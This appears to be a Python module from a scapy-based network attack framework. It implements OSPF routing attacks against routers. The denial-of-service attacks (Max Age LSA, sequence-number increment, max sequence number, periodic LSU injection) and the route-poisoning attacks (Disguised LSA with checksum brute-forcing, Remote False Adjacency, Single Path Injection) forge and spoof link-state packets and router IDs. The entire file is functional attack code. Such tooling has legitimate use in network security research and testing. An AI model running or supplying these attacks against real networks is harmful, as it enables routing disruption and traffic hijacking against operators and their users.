import asyncio
import logging
from scapy.contrib.ospf import *
from scapy.packet import Packet
from scapy.layers.l2 import Ether, arping, ARP
from scapy.sendrecv import sendp, send, sniff, AsyncSniffer
from scapy.packet import Packet
from scapy.all import Net, get_if_addr

from libs.aux_funcs import type_wrapper, send_l3_single, send_l3_loop, attack_cat, attack_layer, attack_type, EXIT_SIGNAL
from time import sleep
from consolemenu import SelectionMenu

def _ospf_sniff(iface, timeout=30) -> list:
    lst = sniff(count = 0, filter= "proto ospf", timeout=int(timeout), iface=iface)
    lst = [p for p in lst if p.haslayer(OSPF_LSUpd)]
    return lst

def _ospf_select_pkt(lst: list):
    pkt_index = SelectionMenu.get_selection([p[OSPF_LSUpd].__repr__() for p in lst])

    return lst[pkt_index]

def _ospf_bruteforce_checksum(pkt, checksum):

    pkt = OSPF_Router_LSA(pkt.build())  # Set all missing fields
    
    id_n = 0x00000000 # Set initial ID to 0.0.0.0

    # Create dummy link
    dummy_link = OSPF_Link(type = 3, data = "255.255.255.255", id = id_n, metric = 0)

    # Set relevant fields
    pkt.len = None
    pkt.chksum = None
    pkt.linkcount += 1
    pkt.linklist.append(dummy_link)

    # Loop to bruteforce the checksum
    while True:
        pkt = OSPF_Router_LSA(pkt.build())
        if pkt.chksum == checksum:
            break
        pkt.chksum = None
        id_n += 1
        pkt.linklist[-1].id = id_n

    return pkt


def _ospf_reset_lsu_chksum(pkt: Packet, index) -> Packet:
    if pkt.haslayer(IP):
        pkt[IP].len = None
        pkt[IP].chksum = None
    pkt[OSPF_Hdr].chksum = None
    pkt[OSPF_Hdr].len = None
    pkt[OSPF_LSUpd].lsalist[index].len = None
    pkt[OSPF_LSUpd].lsalist[index].chksum = None
    return pkt

def _ospf_sniff_sel_lsa(args):

    lst = _ospf_sniff(args['iface'], args['timeout'])

    str_lst = [s.show(dump=True) for s in lst]

    sel = SelectionMenu.get_selection(str_lst)

    return lst[sel]

def _ospf_lsa_modify_parameter(lsa):
    
    lsa_type = lsa.type

    if lsa_type == 1:
        # ROUTER LSA

        # TODO decouple display from logic
        # TODO loop for various modifications

        link_str = [s.show(dump=True) for s in lsa.linklist]

        # Select link to modify
        sel = SelectionMenu.get_selection(link_str)

        sel_link = lsa.linklist[sel]

        # Select parameter to modify

        sel = SelectionMenu.get_selection(['Link ID', 'Link Data', 'Metric'])

        if sel == 0:    # Link ID
            sel_link.id = input(f"Introduce new value for Link ID (current: {sel_link.id}): ")
        elif sel == 1:  # Link data
            sel_link.data = input(f"Introduce new value for Link Data (current: {sel_link.data}): ")
        elif sel == 2:  # Modify Metric
            sel_link.metric = int(input(f"Introduce new metric value (current: {sel_link.metric}): "))
    return

def _ospf_parse_lsu(args: dict) -> Packet:
    ospf = args['lsu_info']['ospf']

    # Build the LSU/LSA list
    lsalist = []
    raw_lsalist = ospf['lsa_list']
    
    # Parse individual LSAs
    for raw_lsa in raw_lsalist: 
        lsa_type = raw_lsa['type']

        nlsa = _parse_lsa(ospf, raw_lsa, lsa_type)

        lsalist.append(nlsa)

    # Create OSPF Header and LSU
    pkt = OSPF_Hdr(type=4,src = ospf['router_id'], area = ospf['area_id'])/OSPF_LSUpd(lsalist=lsalist,lsacount=len(lsalist))

    return pkt

def _parse_lsa(ospf, raw_lsa, lsa_type):
    
    if lsa_type == 'router_lsa':
        flgs = raw_lsa['v'] << 2 | raw_lsa['e'] << 1 | raw_lsa['b']
        nlink_lst = []

        for rlink in raw_lsa['links']:
            nlink = OSPF_Link(id=rlink['link_id'], data=rlink['link_data'], type=rlink['type'], \
                metric=rlink['metric'])
            nlink_lst.append(nlink)

        nlsa = OSPF_Router_LSA(flags=flgs, id=raw_lsa['ls_id'], adrouter=raw_lsa['ls_id'], \
            linklist=nlink_lst, linkcount=len(nlink_lst))

    elif lsa_type == 'network_lsa':
        nlsa = OSPF_Network_LSA(id = raw_lsa['ls_id'], adrouter = raw_lsa['adv_router'], \
            mask = raw_lsa['mask'], routerlist = raw_lsa['attached_router'])
            
    elif lsa_type == 'summary_lsa':
        if raw_lsa['lsa_type'] == 3: # Type 3 LSA
            nlsa = OSPF_SummaryIP_LSA(id = raw_lsa['ls_id'], adrouter = ospf['router_id'], \
                mask = raw_lsa['mask'], metric = raw_lsa['metric'])
        elif raw_lsa['lsa_type'] == 4: #Type 4 LSA
            nlsa = OSPF_SummaryASBR_LSA(id = raw_lsa['ls_id'], adrouter = ospf['router_id'], \
                mask = raw_lsa['mask'], metric = raw_lsa['metric'])
            
    elif lsa_type == 'external_lsa':
        nlsa = OSPF_External_LSA(id = raw_lsa['ls_id'], adrouter = ospf['router_id'], \
            mask = raw_lsa['mask'], ebit = raw_lsa['e'], metric = raw_lsa['metric'], \
            fwdaddr = raw_lsa['fwd_addr'], tag = raw_lsa['ext_rt_tag'])

    elif lsa_type == 'nssa_lsa':
        nlsa = OSPF_NSSA_External_LSA(id = raw_lsa['ls_id'], adrouter = ospf['router_id'], \
            mask = raw_lsa['mask'], ebit = raw_lsa['e'], metric = raw_lsa['metric'], \
            fwdaddr = raw_lsa['fwd_addr'], tag = raw_lsa['ext_rt_tag'])

    return nlsa

@type_wrapper(name="Max Age LSA (Import)", type=attack_type.DoS, category=attack_cat.Attack, layer=attack_layer.L3_OSPF, arg_list=[])
def ospf_max_age_import(args: dict) -> dict:

    """Performs a Max Age LSA attack. Utilizes an imported LSA.
    Requires no additional arguments."""

    # Parse lsu from config
    pkt = _ospf_parse_lsu(args)

    # Set max age in LSA_hdr
    for i in range(len(pkt[OSPF_LSUpd].lsalist)):
        pkt[OSPF_LSUpd].lsalist[i].age = 3600
        pkt[OSPF_LSUpd].lsalist[i].seq = 0x8100000 # Arbitrarily high sequence number to override the current LSA
    
    while not EXIT_SIGNAL.is_set():
        # MAX AGE attack increases seq number by 2 (1 for fightback, 1 for current)
        for i in range(len(pkt[OSPF_LSUpd].lsalist)):
            pkt[OSPF_LSUpd].lsalist[i].seq += 2

        args['pkt'] = IP(dst="224.0.0.5")/pkt

        # Send the packet
        send_l3_single(args)

        # Sleep interval for changes to propagate
        sleep(1)


@type_wrapper(name="Max Age LSA (Sniff)", type=attack_type.DoS, category=attack_cat.Attack, layer=attack_layer.L3_OSPF, arg_list=[])
def ospf_max_age_sniff(args: dict) -> dict:

    """Perform a Max Age LSA attack. Sniffs an LSA from the connected interface."""

    # Sniff and select LSU
    pkt = _ospf_sniff_sel_lsa(args)

    # Set max age in LSA_hdr
    for i in range(len(pkt[OSPF_LSUpd].lsalist)):
        pkt[OSPF_LSUpd].lsalist[i].age = 3600
        pkt[OSPF_LSUpd].lsalist[i].seq = 1
    
    while not EXIT_SIGNAL.is_set():
        # MAX AGE attack increases seq number by 2 (1 for fightback, 1 for current)
        for i in range(len(pkt[OSPF_LSUpd].lsalist)):
            pkt[OSPF_LSUpd].lsalist[i].seq += 2

        args['pkt'] = IP(dst="224.0.0.5")/pkt

        # Send the packet
        send_l3_single(args)

        # Sleep interval for changes to propagate
        sleep(1)

@type_wrapper(name="Seq++ Attack", type=attack_type.DoS, category=attack_cat.Attack, layer=attack_layer.L3_OSPF, arg_list=[])
def ospf_seq_increment(args):
    
    """Performs a sequence increment attack. Utilizes an imported LSA.
    Requires no additional arguments"""

    # Parse lsu from config
    ospf_pkt = _ospf_parse_lsu(args)

    while not EXIT_SIGNAL.is_set():
        # Increment seq# for all LSAs
        for i in range(len(ospf_pkt[OSPF_LSUpd].lsalist)):
            ospf_pkt[OSPF_LSUpd].lsalist[i].seq += 2 

        args['pkt'] = IP(dst="224.0.0.5")/ospf_pkt

        # Send the packet
        send_l3_single(args)

        # Sleep interval for changes to propagate
        sleep(1)

# NOTE: Performing the attack as is on a c3725 router will lead to instability where the originator will try to continuosly purge the LSA, but won't be able to
@type_wrapper(name="Max Seq # LSA", type=attack_type.DoS, category=attack_cat.Attack, layer=attack_layer.L3_OSPF, arg_list=[])
def ospf_max_seq_num(args):

    """Performs a Max seq # attack. Utilizes an imported LSA"""

    # Parse lsu from config
    pkt = _ospf_parse_lsu(args)

    # Set seq# to max in LSA_Hdr
    for lsa in pkt[OSPF_LSUpd].lsalist:
        lsa.seq = 0x7FFFFFFF

    args['pkt'] = IP(dst="224.0.0.5")/pkt
    args['interval'] = 1

    # Send the packet
    send_l3_loop(args)


@type_wrapper(name="Periodic Injection", type=attack_type.DoS, category=attack_cat.Attack, layer=attack_layer.L3_OSPF, arg_list=['source_ip','target_ip'])
def ospf_periodic_injection(args):

    """Performs a Periodic Injection attack. Utilizes an imported list of LSAs to inject into the network"""

    def _aux_inc_seq(pkt, seq = None):
        for i in range(len(pkt[OSPF_LSUpd].lsalist)):
            if seq == None:
                pkt[OSPF_LSUpd].lsalist[i].seq += 2
            else:
                pkt[OSPF_LSUpd].lsalist[i].seq = seq
        return pkt

    period = 4 #seconds

    #get the lsu
    lsu = _ospf_parse_lsu(args)

    lsu_pkt = Ether(dst="01:00:5e:00:00:05")/IP(src=args['source_ip'], dst=args['target_ip'], ttl=1)/lsu
    
    # set initial seq#
    lsu_pkt = _aux_inc_seq(lsu_pkt, 0x81000000)
    
    # send the initial packet
    sendp(lsu_pkt, iface=args['iface'])

    logging.debug("Injecting initial LSU...")

    # send it in a loop
    while not EXIT_SIGNAL.is_set():
        lsu_pkt = _aux_inc_seq(lsu_pkt)
        sendp(lsu_pkt, iface=args['iface'])
        sleep(period)
    
    logging.debug("Stopping periodic injection...")
    return



@type_wrapper(name="Disguised LSA", type=attack_type.RoutePoisoning, category=attack_cat.Attack, layer=attack_layer.L3_OSPF, arg_list=['alt_router_id', 'timeout'])
def ospf_disguised_lsa(args):

    """Performs a Disguised LSA attack. Uses a sniffed LSA and modifies/inserts fake values."""

    # Sniff LSA
    pkt = _ospf_sniff_sel_lsa(args)

    # Remove Ether and IP layers, reset OSPF checksum and packet length
    pkt = pkt[OSPF_Hdr]
    pkt.chksum = None
    pkt.len = None

    # Create 3 separate packets
    pkt1, pkt2, pkt3 = eval(pkt.command()), eval(pkt.command()), eval(pkt.command())

    # Select which lsa to modify
    lsalst_str = [s.show(dump=True) for s in pkt[OSPF_LSUpd].lsalist]
    sel_index = SelectionMenu.get_selection(lsalst_str)

    if sel_index == len(lsalst_str): # If user selects exit
        return

    # pkt3 will mimic the future fightback
    # adapt pkt3's parameters to match the fightback lsa
    pkt3[OSPF_LSUpd].lsalist[sel_index].seq += 2
    # Reset checksum
    pkt3 = _ospf_reset_lsu_chksum(pkt3, sel_index)
    # Extract the checksum
    fightback_chksum = OSPF_Hdr(pkt3.build())[OSPF_LSUpd].lsalist[sel_index].chksum

    # pkt1 will trigger fight-back
    pkt1[OSPF_LSUpd].lsalist[sel_index].linklist[0].metric = 0
    pkt1[OSPF_LSUpd].lsalist[sel_index].seq += 1

    # reset checksum and len for pkt1
    pkt1 = _ospf_reset_lsu_chksum(pkt1, sel_index)

    # pkt2 will be the disguised LSA
    # Modify the links
    _ospf_lsa_modify_parameter(pkt2[OSPF_LSUpd].lsalist[sel_index])
    # Reset checksums and lens
    pkt2 = _ospf_reset_lsu_chksum(pkt2, sel_index)
    # Increase seq #
    pkt2[OSPF_LSUpd].lsalist[sel_index].seq += 2
    # Brute force checksum
    print("Brute forcing LSA checksum...")
    pkt2[OSPF_LSUpd].lsalist[sel_index] = _ospf_bruteforce_checksum(pkt2[OSPF_LSUpd].lsalist[sel_index], fightback_chksum)
    print("Done")
    
    # Add IP & Ethernet layer
    pkt1 = Ether(dst="01:00:5e:00:00:05")/IP(dst="224.0.0.5", src = get_if_addr(args['iface']))/pkt1
    pkt2 = Ether(dst="01:00:5e:00:00:05")/IP(dst="224.0.0.5", src = get_if_addr(args['iface']))/pkt2

    # Modify OSPF header info so LSA is accepted by local routers
    pkt1[OSPF_Hdr].src = args['alt_router_id']
    pkt2[OSPF_Hdr].src = args['alt_router_id']

    # Send the LSUs
    sendp([pkt1, pkt2], iface=args['iface'], inter=2)    

    return args





@type_wrapper(name="Remote False Adjacency", type=attack_type.RoutePoisoning, category=attack_cat.Attack, layer=attack_layer.L3_OSPF, arg_list=["victim_IP","victim_id"])
def ospf_remote_false_adjacency(args):
    """Performs a Remote False Adjacency Attack on the target router. Uses imported LSA data.
    Requires two additional arguments:
    arg         desc                        example value
    victim_IP   IP address of the DR        10.10.10.1
    victim_id   OSPF ID of the DR           1.1.1.1
    """

    async def _ospf_loop_hello(args):
        # Get parameters from arguments
        victim_IP = args['victim_IP']
        victim_id = args['victim_id']

        # Get relevant parameters from imported config
        phantom_IP = args['lsu_info']['ospf']['interface_addr']
        phantom_id = args['lsu_info']['ospf']['router_id']
        mask = args['lsu_info']['ospf']['interface_netmask']
        area_id = args['lsu_info']['ospf']['area_id']

        # Create Hello packet structure
        hello_tlv = OSPF_LLS_Hdr(llstlv=[LLS_Extended_Options(type=1,len=4,options='\x00\x00\x00\x01')])        # LLS header 
        hello_payld = OSPF_Hello(router=victim_IP,backup=victim_IP,mask=mask,neighbors=[victim_id],options=0x12)# Hello packet
        hello_hdr = OSPF_Hdr(src=phantom_id, area=area_id)                                                      # OSPF header
        hello_IP = IP(src=phantom_IP, dst = victim_IP)

        hello_pkt = hello_IP/hello_hdr/hello_payld/hello_tlv

        # Send Hello every 30 seconds
        try:
            while True:
                print("Sending hello pkt...")
                send(hello_pkt,iface=args['iface'],verbose=False)
                await asyncio.sleep(30)
        except asyncio.CancelledError:
            return

    async def _dbd_coro(args):
        victim_IP = args['victim_IP']
        victim_id = args['victim_id']
        
        # Get required parameters from imported config
        phantom_IP = args['lsu_info']['ospf']['interface_addr']
        phantom_id = args['lsu_info']['ospf']['router_id']
        area_id = args['lsu_info']['ospf']['area_id']

        # sleep for 5 sec so the hello coroutine executes first
        await asyncio.sleep(5)

        # First, do dbd exchange
        db_seq = 1 # NOTE seq number can be 1

        dbd1 = IP(src=phantom_IP, dst=victim_IP)/OSPF_Hdr(type=2, src=phantom_id, area=area_id)/\
            OSPF_DBDesc(dbdescr=0x07, ddseq=db_seq, options=0x52)/\
                OSPF_LLS_Hdr(llstlv=[LLS_Extended_Options(type=1,len=4,options='\x00\x00\x00\x01')])
        print("Sending dbd1...")
        send(dbd1, iface=args['iface'],verbose=False)
        await asyncio.sleep(3)

        # Send 8 dbd messages
        for c in range(0,8):
            db_seq += 1
            dbd2 = IP(src=phantom_IP, dst=victim_IP)/OSPF_Hdr(type=2, src=phantom_id, area=area_id)/\
                OSPF_DBDesc(dbdescr=0x03, ddseq=db_seq, options=0x52)/\
                    OSPF_LLS_Hdr(llstlv=[LLS_Extended_Options(type=1,len=4,options='\x00\x00\x00\x01')])
            print(f"Sending dbd2 nr {c+1}...")
            send(dbd2, iface=args['iface'],verbose=False)
            await asyncio.sleep(3)

        # Terminate dbd exchange
        db_seq += 1
        dbd3 = IP(src=phantom_IP, dst=victim_IP)/OSPF_Hdr(type=2, src=phantom_id, area=area_id)/\
            OSPF_DBDesc(dbdescr=0x01, ddseq=db_seq, options = 0x52)/\
                OSPF_LLS_Hdr(llstlv=[LLS_Extended_Options(type=1,len=4,options='\x00\x00\x00\x01')])
        print("Sending dbd3...")
        send(dbd3, iface=args['iface'],verbose=False)        
        
        # Sniff the new network LSA and send ack
        # Define stop function for sniffer, will stop when the Network LSA sent by DR is captured
        def stop_func(pkt):
            if not pkt.haslayer(OSPF_Network_LSA): return False
            return pkt[OSPF_Network_LSA].adrouter == victim_id

        # Start sniffer
        sniffer = AsyncSniffer(lfilter = stop_func, iface = args['iface'])
        sniffer.start()

        # Send fake lsu
        lsu = _ospf_parse_lsu(args)

        lsu_pkt = IP(src=phantom_IP, dst=victim_IP)/lsu
        print("Injecting LSU...")
        send(lsu_pkt,iface=args['iface'],verbose=False)

        await asyncio.sleep(10) # Wait for flooding process to stabilize 

        sniff_p = sniffer.stop()[0]     # Stop sniffer and obtain the packet
        
        # Obtain the lsa
        net_lsa = sniff_p[OSPF_LSUpd].lsalist[0]

        # Create ack packet. LSA Header contains same values as sniffed LSA
        ack_pkt = IP(src = phantom_IP, dst = victim_IP)/OSPF_Hdr(type=5, src = phantom_id, area = area_id)/\
            OSPF_LSAck(lsaheaders = [\
                OSPF_LSA_Hdr(age = net_lsa.age, options = net_lsa.options, type = net_lsa.type, id = net_lsa.id,\
                    adrouter = net_lsa.adrouter, seq = net_lsa.seq, chksum = net_lsa.chksum, len = net_lsa.len)])   

        # Send ack packet
        send(ack_pkt, iface = args['iface'], verbose = 0)     
     
        print("Done")
        print("Press ctrl+c to interrupt attack...")
        return

    async def main(args):
        # Start hello and dbd coroutines, block until ctrl+c
        gth = asyncio.gather(asyncio.create_task(_ospf_loop_hello(args)), asyncio.create_task(_dbd_coro(args)))
        while not EXIT_SIGNAL.is_set():
            await asyncio.sleep(0.5)
        
        logging.debug("Received interrupt...")
        gth.cancel()

    
    asyncio.run(main(args))    
    
    return args
               


@type_wrapper(name = "Single Path Injection", type=attack_type.RoutePoisoning, category=attack_cat.Attack, layer= attack_layer.L3_OSPF, arg_list=["springb_ip","polluted_ip"])
def ospf_sigle_path_injection(args):
    """Performs a Single Path Injection attack on the target polluted router, using the springboard IP.
    Utilizes imported LSA data.
    Requires two additional arguments:
    arg             desc                                example value
    springb_ip      Springboard router IP address       10.10.10.2
    polluted_ip     Polluted router IP address          10.10.10.1
    """

    # Obtain required IP addresses
    springb_ip = args["springb_ip"]
    polluted_ip = args["polluted_ip"]

    # Build the false LSU
    lsu = _ospf_parse_lsu(args)

    # Change the seq# for the pkt to be accepted
    for lsa in lsu.lsalist:
        lsa.seq = 0x7fff0000    # NOTE this sequence number can be as arbitrarily high as needed
    # Construct the other layers
    pkt = IP(src=springb_ip, dst=polluted_ip, proto=89)/lsu

    # Send the packet
    send(pkt, iface=args["iface"])

    return args